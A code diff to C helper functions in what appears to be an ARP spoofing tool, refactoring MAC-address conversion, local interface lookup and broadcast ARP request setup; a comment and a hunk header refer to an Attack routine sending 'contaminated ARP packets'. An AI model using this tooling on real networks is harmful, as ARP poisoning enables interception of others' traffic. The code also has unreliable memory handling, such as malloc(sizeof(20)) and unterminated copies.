@@ -2,22 +2,26 @@
 #include "Processing.h"
 
 // ########## Define a function to elimate special character ##########
-void delChar(char* buf, char* dest, char ch){
+char* delChar(char* buf, char ch){
 	int cnt = 0;
+	char* result = (char*)malloc(sizeof(20));
 	for(int i = 0; buf[i] != 0; i++){
 		if(buf[i] != ch){
-			dest[cnt] = buf[i];
+			//printf("result : %s\n", result);
+			result[cnt] = buf[i];
 			cnt++;
 		}
 	}
 	buf[cnt] = 0;
+	return result;
 }
 
 // ########## Define a function to insert zero ##########
-void convert_mac(const char* data, char* cvrt_str, int s){
+char* convert_mac(const char* data){
 	char buf[128] = {0x00, };
 	char t_buf[8];
 	char* stp = strtok((char*)data, ":");
+	char* result_str = (char*)malloc(sizeof(32));
 	int temp = 0;
 	do{
 		memset(t_buf, 0x0, sizeof(t_buf));
@@ -25,10 +29,12 @@ void convert_mac(const char* data, char* cvrt_str, int s){
 		snprintf(t_buf, sizeof(t_buf)-1, "%02x", temp);
 		strncat(buf, t_buf, sizeof(buf)-1);
 		strncat(buf, ":", sizeof(buf)-1);
+		//printf("buf : %s\n", buf);
 	}
 	while((stp = strtok(NULL, ":")) != NULL);
 	buf[strlen(buf)-1] = '\0';
-	strncpy(cvrt_str, buf, s);
+	strncpy(result_str, buf, strlen(buf));
+	return result_str;
 }
 
 // ########## Sending contaminated ARP packets ##########
@@ -73,11 +79,13 @@ void* Attack(void* info){
 	}
 }
 
-void* find_My_Mac(void* info){
-	char* temp_a_ip_addr = (char*)(info);
+struct Info_mymac* find_My_Mac(){
+	struct Info_mymac* IM = (struct Info_mymac*)malloc(sizeof(struct Info_mymac));
 	int sockfd, req_cnt = REQ_CNT;
-	char s_mac_addr[128] = {0x00, };
-	char* s_ip_addr = (char*)malloc(128);
+	char* s_mac_addr = (char*)malloc(128);
+	if(s_mac_addr == NULL){ perror("s_mac_addr malloc error"); exit(1); }
+	char* s_ip_addr = (char*)malloc(50);
+	if(s_ip_addr == NULL){ perror("s_ip_addr malloc error"); exit(1); }
 
 	struct sockaddr_in* sock;
 	struct ifconf ifcnf_s;
@@ -111,16 +119,25 @@ void* find_My_Mac(void* info){
 
 		if(ifr_s->ifr_flags & IFF_LOOPBACK) continue;
 		sock = (struct sockaddr_in*)&ifr_s->ifr_addr;
-		//sprintf(s_ip_addr, "%s", inet_ntoa(sock->sin_addr));
+		sprintf(s_ip_addr, "%s", inet_ntoa(sock->sin_addr));
 		if(ioctl(sockfd, SIOCGIFHWADDR, ifr_s) < 0){
 			perror("ioctl - SIOCGFHWADDR error");
 			return NULL;
 		}
-		convert_mac(ether_ntoa((struct ether_addr*)(ifr_s->ifr_hwaddr.sa_data)), s_mac_addr, sizeof(s_mac_addr)-1);
+		strncpy(s_mac_addr, convert_mac(ether_ntoa((struct ether_addr*)(ifr_s->ifr_hwaddr.sa_data))), 20);
 	}
-
-	delChar((char*)s_mac_addr, temp_a_ip_addr, ':'); //s_mac_addr
-	return (void*)(s_ip_addr);
+	char* smac = (char*)malloc(128);
+	strncpy(smac, delChar(s_mac_addr, ':'), 20);
+	//printf("smac : %s\n", smac);
+	IM->my_mac = (char*)malloc(20);
+	if(IM->my_mac == NULL){ perror("IM->my_mac malloc error"); exit(1); }
+	IM->my_ip = (char*)malloc(20);
+	if(IM->my_ip == NULL){ perror("IM->my_ip malloc error"); exit(1); }
+	strncpy(IM->my_mac, smac, strlen(smac));
+	strncpy(IM->my_ip, s_ip_addr, strlen(s_ip_addr));
+	//printf("%s %s\n", smac, s_ip_addr);
+	//printf("%s %s\n", IM->my_mac, IM->my_ip);
+	return IM;
 }
 
 void* find_Mac(void* info){
@@ -132,6 +149,14 @@ void* find_Mac(void* info){
 	if(sender_mac == NULL){ perror("sender_mac malloc error"); exit(1); }
 	printf("[ < Session %d > / Starting to find < %s > mac address ]\n", PP->session_Number, PP->tip);
 
+	char* broadcast_mac1 = (char*)malloc(sizeof(13));
+	if(broadcast_mac1 == NULL){ perror("broadcast_mac1 malloc error"); exit(1); }
+	strncpy(broadcast_mac1, "ffffffffffff", 12);
+
+	char* broadcast_mac2 = (char*)malloc(sizeof(13));
+	if(broadcast_mac2 == NULL){ perror("broadcast_mac2 malloc error"); exit(1); }
+	strncpy(broadcast_mac2, "000000000000", 12);
+
 	ah->frame_type = htons(ARP_FRAME_TYPE);
 	ah->mac_type = htons(ETHER_MAC_TYPE);
 	ah->prot_type = htons(IP_PROTO_TYPE);
@@ -142,8 +167,8 @@ void* find_Mac(void* info){
 	tomar_ip_addr(&src_in_addr, PP->sip);
 	tomar_ip_addr(&target_in_addr, PP->tip);
 
-	tomar_mac_addr(ah->Destination_mac_addr, "ffffffffffff");
-	tomar_mac_addr(ah->target_mac_addr, "000000000000");
+	tomar_mac_addr(ah->Destination_mac_addr, broadcast_mac1);
+	tomar_mac_addr(ah->target_mac_addr, broadcast_mac2);
 	tomar_mac_addr(ah->src_mac_addr, PP->smac);
 	tomar_mac_addr(ah->sender_mac_addr, PP->smac);
 
@@ -193,11 +218,13 @@ ah->target_ip_addr[1], ah->target_ip_addr[2], ah->target_ip_addr[3]);
 			break;
 		}
 		count++;
-		sleep(1);
+		sleep(0.2);
 	}
 
 	sprintf(sender_mac, "%02x%02x%02x%02x%02x%02x", temp->sender_mac_addr[0], 
 temp->sender_mac_addr[1], temp->sender_mac_addr[2], temp->sender_mac_addr[3], temp->sender_mac_addr[4], temp->sender_mac_addr[5]);
+	free(broadcast_mac1);
+	free(broadcast_mac2);
 	return (void*)(sender_mac);
 }
 
